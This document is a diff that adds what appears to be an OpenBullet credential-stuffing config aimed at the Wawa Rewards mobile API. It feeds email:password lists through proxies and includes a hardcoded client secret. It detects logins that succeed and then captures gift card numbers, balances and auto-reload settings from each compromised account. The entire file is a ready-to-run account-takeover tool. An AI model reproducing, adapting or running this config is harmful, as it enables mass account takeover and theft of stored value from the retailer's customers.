@@ -1,0 +1,77 @@
+[SETTINGS]
+{
+  "Name": "Wawa",
+  "SuggestedBots": 60,
+  "LastModified": "2019-04-05T18:59:37.2456187+02:00",
+  "AdditionalInfo": "",
+  "Author": "Fairy#6869",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get_Token REQUEST POST "https://mob2api.mdc53.com/v4/authenticate" 
+  CONTENT "x" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTMLchr(Comma) like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: mob2api.mdc53.com\nConnection: keep-alive" 
+  HEADER "mdc-client_id: wawawebtest" 
+  HEADER "mdc-client_secret: Pk3rZYbM5dLNsiKUfK3zA3L0MGWgKYTZeUzEhN8" 
+#Access_Token PARSE "<SOURCE>" JSON "accessToken" -> VAR "TOK" 
+#ID_Function FUNCTION RandomNum 1000000 9999999 -> VAR "NUM" 
+#Login REQUEST POST "https://mob2api.mdc53.com/v4/login" 
+  CONTENT "{\"deviceId\":<NUM>,\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Wawa/1 CFNetwork/758.1.6 Darwin/15.0.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: mob2api.mdc53.com" 
+  HEADER "mdc-wawaappversion: 4.2.11" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Proxy-Connection: keep-alive" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Authorization: Bearer <TOK>" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Your Wawa Rewards username or password was entered incorrectly" 
+  KEYCHAIN Success OR 
+    KEY "{\"accessToken" 
+#Access_Token_2 PARSE "<SOURCE>" JSON "accessToken" -> VAR "TOK2" 
+#Customer_ID PARSE "<SOURCE>" JSON "customerID" -> VAR "CID" 
+#Get_Data REQUEST GET "https://mob2api.mdc53.com/v4/customer/giftcards?giftCardNumber=true" 
+  
+  HEADER "User-Agent: Wawa/1 CFNetwork/758.1.6 Darwin/15.0.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: mob2api.mdc53.com" 
+  HEADER "mdc-wawaappversion: 4.2.11" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Proxy-Connection: keep-alive" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Authorization: Bearer <TOK2>" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "mdc-customerid: <CID>" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "balance" 
+#GC_Number PARSE "<SOURCE>" JSON "giftCardNumber" Recursive=TRUE -> CAP "GC Number" 
+#Balance PARSE "<SOURCE>" LR ",\"balance\":" "," Recursive=TRUE -> VAR "Balance" 
+#Auto_Reload PARSE "<SOURCE>" JSON "autoReload" Recursive=TRUE -> CAP "Auto Reload" 
